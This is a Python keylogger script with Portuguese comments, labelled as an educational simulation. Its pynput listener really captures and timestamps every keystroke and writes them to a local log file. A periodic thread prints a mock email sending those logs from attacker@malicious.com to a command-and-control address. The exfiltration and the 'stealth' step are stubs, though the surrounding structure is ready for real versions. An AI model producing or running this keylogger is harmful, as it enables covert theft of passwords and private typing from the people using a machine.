#!/usr/bin/env python3
"""
KEYLOGGER SIMULADO - FINS EDUCACIONAIS
Demonstra captura de entrada de teclado para estudo de defesas
"""

from pynput import keyboard
import datetime
import os
import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading
import time

# CONFIGURAÇÕES
LOG_FILE = "logs/keystrokes.log"
SEND_INTERVAL = 60  # Envia logs a cada 60 segundos (simulação)
EMAIL_SIMULATION = True  # True = apenas simula, False = enviaria real

# Criar pasta de logs
os.makedirs("logs", exist_ok=True)

class KeyloggerSimulado:
    def __init__(self):
        self.log = []
        self.start_time = datetime.datetime.now()
        self.listener = None
        
    def on_press(self, key):
        """Callback quando tecla é pressionada"""
        try:
            # Tecla alfanumérica
            key_str = key.char
        except AttributeError:
            # Tecla especial
            key_str = f"[{key}]"
        
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] {key_str}"
        self.log.append(entry)
        
        # Salva em tempo real
        self.save_log()
        
        # Mostra no console (para demonstração)
        print(f"Capturado: {key_str}", end="\r")
        
        # Encerra com ESC (segurança para demo)
        if key == keyboard.Key.esc:
            print("\n[!] Encerrando keylogger (ESC pressionado)")
            return False
    
    def save_log(self):
        """Salva log em arquivo"""
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            for entry in self.log:
                f.write(entry + "\n")
        self.log = []  # Limpa buffer
    
    def send_email_simulated(self):
        """Simula envio de logs por email"""
        if not EMAIL_SIMULATION:
            return
            
        if not os.path.exists(LOG_FILE):
            return
            
        try:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                content = f.read()
            
            if not content.strip():
                return
            
            # SIMULAÇÃO: Apenas imprime no console
            print(f"\n[!] SIMULAÇÃO DE ENVIO EMAIL [{datetime.datetime.now()}]")
            print("-" * 40)
            print(f"De: attacker@malicious.com")
            print(f"Para: command@control.com")
            print(f"Assunto: Logs de {os.getlogin()} - {datetime.datetime.now()}")
            print("-" * 40)
            print(f"Conteúdo ({len(content)} caracteres):")
            print(content[:500] + "..." if len(content) > 500 else content)
            print("-" * 40)
            print("[+] Email simulado 'enviado' com sucesso")
            
            # Limpa arquivo após "envio"
            open(LOG_FILE, "w").close()
            
        except Exception as e:
            print(f"[!] Erro na simulação: {e}")
    
    def auto_sender(self):
        """Thread para envio automático periódico"""
        while self.listener.is_alive():
            time.sleep(SEND_INTERVAL)
            self.send_email_simulated()
    
    def start(self):
        """Inicia o keylogger"""
        print("=" * 50)
        print("KEYLOGGER SIMULADO - FINS EDUCACIONAIS")
        print("=" * 50)
        print(f"Log: {os.path.abspath(LOG_FILE)}")
        print(f"Intervalo de envio: {SEND_INTERVAL}s")
        print("Pressione ESC para encerrar")
        print("=" * 50)
        
        # Inicia listener
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        
        # Inicia thread de envio automático
        sender_thread = threading.Thread(target=self.auto_sender)
        sender_thread.daemon = True
        sender_thread.start()
        
        # Aguarda
        self.listener.join()
        
        # Envio final
        self.send_email_simulated()
        print(f"[+] Log final salvo em: {LOG_FILE}")

def hide_console():
    """Oculta console (simulação de furtividade)"""
    # Em Windows: usar ctypes para ocultar janela
    # Em Linux: daemonize processo
    # Aqui apenas simulamos com mensagem
    print("[*] Modo furtivo: Processo oculto (simulação)")

if __name__ == "__main__":
    # Verificação de ambiente
    print("\n[!] AVISO: Execute apenas em VM isolada!")
    confirm = input("Confirmar início? (digite 'KEYSIM'): ")
    
    if confirm != "KEYSIM":
        print("[-] Cancelado")
        sys.exit(0)
    
    # Inicia
    kl = KeyloggerSimulado()
    kl.start()
